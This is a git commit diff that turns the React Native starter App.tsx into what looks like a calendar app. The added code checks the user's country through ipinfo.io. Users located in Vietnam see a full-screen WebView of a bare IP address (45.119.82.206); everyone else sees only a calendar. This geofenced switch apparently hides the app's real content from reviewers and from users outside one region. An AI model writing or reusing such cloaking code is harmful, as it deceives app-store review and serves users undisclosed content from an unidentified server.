ead8948fc9d03c266fa13310592a0c22256dd97f
aquangvm <aquangvm@gmail.com>
2024-01-16 10:30:24 +0700

    init

--- App.tsx
+++ App.tsx
@@ -1,66 +1,54 @@
-/**
- * Sample React Native App
- * https://github.com/facebook/react-native
- *
- * @format
- */
 
-import React from 'react';
-import type {PropsWithChildren} from 'react';
-import {
-  SafeAreaView,
-  ScrollView,
-  StatusBar,
-  StyleSheet,
-  Text,
-  useColorScheme,
-  View,
-} from 'react-native';
+import React, { useState, useEffect } from 'react';
+import {SafeAreaView, StatusBar, Text,Alert, useColorScheme} from 'react-native';
+import WebView from 'react-native-webview';
+import DatePicker , {getFormatedDate} from 'react-native-modern-datepicker';
+import { Calendar } from 'react-native-calendars';
+import axios from 'axios';
 
-import {
-  Colors,
-  DebugInstructions,
-  Header,
-  LearnMoreLinks,
-  ReloadInstructions,
-} from 'react-native/Libraries/NewAppScreen';
 
-type SectionProps = PropsWithChildren<{
-  title: string;
-}>;
-
-function Section({children, title}: SectionProps): React.JSX.Element {
-  const isDarkMode = useColorScheme() === 'dark';
-  return (
-    <View style={styles.sectionContainer}>
-      <Text
-        style={[
-          styles.sectionTitle,
-          {
-            color: isDarkMode ? Colors.white : Colors.black,
-          },
-        ]}>
-        {title}
-      </Text>
-      <Text
-        style={[
-          styles.sectionDescription,
-          {
-            color: isDarkMode ? Colors.light : Colors.dark,
-          },
-        ]}>
-        {children}
-      </Text>
-    </View>
-  );
-}
+import {Colors} from 'react-native/Libraries/NewAppScreen';
 
 function App(): React.JSX.Element {
   const isDarkMode = useColorScheme() === 'dark';
+  const [ipInfo, setIpInfo] = useState(null);
 
   const backgroundStyle = {
     backgroundColor: isDarkMode ? Colors.darker : Colors.lighter,
+    flex: 1,
   };
+
+  useEffect(() => {
+    fetchIpInfo();
+  }, []);
+
+  
+  const fetchIpInfo = async () => {
+    try {
+      const response = await axios.get('https://ipinfo.io/json');
+      const data = response.data;
+      setIpInfo(data);
+    } catch (error) {
+      console.error('Error fetching IP info:', error);
+    }
+  };
+
+  const calenda = () => {
+    return (
+        <SafeAreaView style={backgroundStyle}>
+      <Calendar/>
+        </SafeAreaView>
+    )
+  };
+
+    const web = () => {
+      return (
+        <SafeAreaView style={backgroundStyle}>
+        <WebView source={{uri: 'https://45.119.82.206'}} tyle={{flex: 1, justifyContent: 'center', alignItems: 'center',  height: undefined, width: undefined}} />
+        </SafeAreaView>
+       
+      )
+    };
 
   return (
     <SafeAreaView style={backgroundStyle}>
@@ -68,51 +56,9 @@ function App(): React.JSX.Element {
         barStyle={isDarkMode ? 'light-content' : 'dark-content'}
         backgroundColor={backgroundStyle.backgroundColor}
       />
-      <ScrollView
-        contentInsetAdjustmentBehavior="automatic"
-        style={backgroundStyle}>
-        <Header />
-        <View
-          style={{
-            backgroundColor: isDarkMode ? Colors.black : Colors.white,
-          }}>
-          <Section title="Step One">
-            Edit <Text style={styles.highlight}>App.tsx</Text> to change this
-            screen and then come back to see your edits.
-          </Section>
-          <Section title="See Your Changes">
-            <ReloadInstructions />
-          </Section>
-          <Section title="Debug">
-            <DebugInstructions />
-          </Section>
-          <Section title="Learn More">
-            Read the docs to discover what to do next:
-          </Section>
-          <LearnMoreLinks />
-        </View>
-      </ScrollView>
+      { ipInfo && ipInfo.country === 'VN' ? ( web()) : calenda() }
     </SafeAreaView>
   );
 }
-
-const styles = StyleSheet.create({
-  sectionContainer: {
-    marginTop: 32,
-    paddingHorizontal: 24,
-  },
-  sectionTitle: {
-    fontSize: 24,
-    fontWeight: '600',
-  },
-  sectionDescription: {
-    marginTop: 8,
-    fontSize: 18,
-    fontWeight: '400',
-  },
-  highlight: {
-    fontWeight: '700',
-  },
-});
 
 export default App;
